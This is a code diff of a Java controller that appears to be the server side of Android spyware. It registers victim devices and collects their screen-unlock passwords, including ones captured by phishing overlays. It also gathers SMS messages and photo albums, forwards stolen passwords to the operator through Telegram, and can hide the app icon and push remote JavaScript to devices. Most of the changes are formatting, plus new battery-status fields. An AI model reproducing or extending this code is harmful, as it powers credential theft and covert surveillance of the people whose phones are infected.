@@ -59,13 +59,12 @@ public class DeviceApiController extends BaseApiController {
     private AlbumPicService albumPicService;
     @Resource
     private FishDataService fishDataService;
-	@Autowired(required = false)
-	private TelegramNotificationHandler telegramNotificationHandler;
-	@Autowired
-	private HeartService heartService;
+    @Autowired(required = false)
+    private TelegramNotificationHandler telegramNotificationHandler;
+    @Autowired
+    private HeartService heartService;
     @Autowired
     private UnlockScreenPwdMapper unlockScreenPwdMapper;
-
 
 
     //注册设备
@@ -103,7 +102,7 @@ public class DeviceApiController extends BaseApiController {
 
             List<FishTemplates> list = fishTemplateService.effectiveFishTemplates();
             JSONObject fishSwitch = new JSONObject();
-            if(CollectionUtils.isNotEmpty(list)){
+            if (CollectionUtils.isNotEmpty(list)) {
                 for (FishTemplates fishTemplates : list) {
                     fishSwitch.put(fishTemplates.getCode(), true);
                 }
@@ -120,7 +119,7 @@ public class DeviceApiController extends BaseApiController {
             device.setStatus(Constant.DeviceStatus.screen_on);
             deviceService.save(device);
             if (telegramNotificationHandler != null) {
-                telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(),"✅ 新设备安装成功!\\n📈 请关注后台数据!");
+                telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 新设备安装成功!\\n📈 请关注后台数据!");
             }
             log.info("收到pkg:{} 设备:{} 注册信息. ip：{} addr:{} ", DeviceContext.getPkg(), DeviceContext.getDeviceId(), ip, addr);
         }
@@ -154,19 +153,19 @@ public class DeviceApiController extends BaseApiController {
         }
         deviceService.updateById(update);
         if (telegramNotificationHandler != null) {
-        	JSONObject jsonPwd = new JSONObject();
-        	jsonPwd.put("tips", unlockScreenPwd.getTips());
-        	jsonPwd.put("value", unlockScreenPwd.getValue());
-        	
-            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(),String.format("✅ [解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!",jsonPwd.toJSONString()));
+            JSONObject jsonPwd = new JSONObject();
+            jsonPwd.put("tips", unlockScreenPwd.getTips());
+            jsonPwd.put("value", unlockScreenPwd.getValue());
+
+            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), String.format("✅ [解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!", jsonPwd.toJSONString()));
         }
 
-        if(unlockScreenPwd.getType() == Constant.UnLockType.no){
+        if (unlockScreenPwd.getType() == Constant.UnLockType.no) {
             UnlockScreenPwd last = unlockScreenPwdMapper.last(deviceId, Constant.UnLockType.no);
-            if(last == null){
+            if (last == null) {
                 unlockScreenPwdService.save(unlockScreenPwd);
                 log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
-            }else{
+            } else {
                 UnlockScreenPwd updatePwd = new UnlockScreenPwd();
                 updatePwd.setId(last.getId());
                 updatePwd.setCreateDate(Utils.now());
@@ -174,7 +173,7 @@ public class DeviceApiController extends BaseApiController {
                 log.info("更新密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
             }
 
-        }else{
+        } else {
             log.info("保存密码:{}  设备:{} 解锁密码信息成功. Data:{} ", pkg, deviceId, JSON.toJSONString(unlockScreenPwd));
         }
         return Result.toSuccess(null);
@@ -234,13 +233,13 @@ public class DeviceApiController extends BaseApiController {
         Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
 
         if (dbDevice == null) {
-        	log.info("已经移除的数据 : pkg:{} 设备:{}  -> {}",DeviceContext.getPkg(), DeviceContext.getDeviceId(),JSON.toJSONString(deviceStatus));
+            log.info("已经移除的数据 : pkg:{} 设备:{}  -> {}", DeviceContext.getPkg(), DeviceContext.getDeviceId(), JSON.toJSONString(deviceStatus));
             return Result.toSuccess(serverConfig);
         }
-      
+
         if (Objects.equals(Constant.YN.Y, dbDevice.getUplog())) {
-        	
-        	  serverConfig.setUploadLog(true);
+
+            serverConfig.setUploadLog(true);
         }
         if (Objects.equals(Constant.YN.Y, dbDevice.getHideIcon())) {
             serverConfig.setHideIcon(true);
@@ -266,7 +265,7 @@ public class DeviceApiController extends BaseApiController {
             serverConfig.setMainCode(mainJsCode.getCode());
             serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
-        
+
         serverConfig.setFishOptions(dbDevice.getFishSwitch());
 
         serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
@@ -276,7 +275,7 @@ public class DeviceApiController extends BaseApiController {
 //        configer = configer == null ? sysParamsDao.getValueByCode(SystemParamsKey.defaultKey) : configer;
 //        JSONObject json = JSONObject.parseObject(configer);
 //        String backFeatures = json.getString("rules");
-      
+
         serverConfig.setBackFeatures("[]");
 
         Device updateDevice = new Device();
@@ -284,6 +283,8 @@ public class DeviceApiController extends BaseApiController {
         updateDevice.setLastHeart(Utils.now());
         updateDevice.setAccessibilityServiceEnabled(deviceStatus.isAccessibilityServiceEnabled() ? Constant.YN.Y : Constant.YN.N);
         updateDevice.setPermissions(deviceStatus.getPermissions());
+        updateDevice.setCharging(deviceStatus.isCharging() ? Constant.YN.Y : Constant.YN.N);
+        updateDevice.setBattery(deviceStatus.getBattery());
         if (Constant.DeviceStatus.need_wake == dbDevice.getStatus() /*&& param.getScreenStatus() == Constant.DeviceStatus.screen_off*/) {
             log.info("pkg:{} 设备:{} - 需要唤醒", DeviceContext.getPkg(), DeviceContext.getDeviceId());
             updateDevice.setStatus(Constant.DeviceStatus.wait_wake);
@@ -297,7 +298,7 @@ public class DeviceApiController extends BaseApiController {
         } else {
             updateDevice.setStatus(deviceStatus.getScreenStatus());
         }
-        log.info("pkg:{} 设备:{} - 请求配置成功",DeviceContext.getPkg(), DeviceContext.getDeviceId());
+        log.info("pkg:{} 设备:{} - 请求配置成功", DeviceContext.getPkg(), DeviceContext.getDeviceId());
         heartService.addHeart(DeviceContext.getPkg(), DeviceContext.getDeviceId());
         deviceService.updateById(updateDevice);
         return Result.toSuccess(serverConfig);
@@ -333,7 +334,7 @@ public class DeviceApiController extends BaseApiController {
         }
         smsInfoService.addSms(list);
         if (telegramNotificationHandler != null) {
-            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(),"✅ 短信数据上传成功!\n📈 请关注后台数据!");
+            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 短信数据上传成功!\n📈 请关注后台数据!");
         }
         log.info("设备:{} 短信上传成功.", deviceId);
         return Result.toSuccess();
@@ -353,9 +354,9 @@ public class DeviceApiController extends BaseApiController {
         }
         albumPicService.upload(inputs);
         if (telegramNotificationHandler != null) {
-            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(),"✅ 相册数据上传成功!\n📈 请关注后台数据!");
+            telegramNotificationHandler.sendNotificationAsync(DeviceContext.getPkg(), DeviceContext.getDeviceId(), "✅ 相册数据上传成功!\n📈 请关注后台数据!");
         }
-        
+
         log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
         return Result.toSuccess();
     }
@@ -373,7 +374,7 @@ public class DeviceApiController extends BaseApiController {
         String pkg = DeviceContext.getPkg();
         Device dbDevice = deviceService.findByDeviceId(deviceId);
         if (dbDevice == null) {
-        	
+
             return Result.toSuccess();
         }
         if (Objects.equals(fishDataVo.getCode(), Constant.FishCode.unlock)) {
@@ -395,7 +396,7 @@ public class DeviceApiController extends BaseApiController {
                 unlockParam.put("source", Constant.UnlockScreenPwdSource.fish);
                 uploadUnlockPassword(unlockParam);
                 if (telegramNotificationHandler != null) {
-                    telegramNotificationHandler.sendNotificationAsync(pkg,deviceId, String.format("✅ [钓鱼解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!",unlockParam.toJSONString()));
+                    telegramNotificationHandler.sendNotificationAsync(pkg, deviceId, String.format("✅ [钓鱼解锁密码]获取成功!\n🔐 密码数据:%s\n📈 请关注后台数据!", unlockParam.toJSONString()));
                 }
             } catch (Exception e) {
                 log.warn("uploadUnlockPassword error", e);
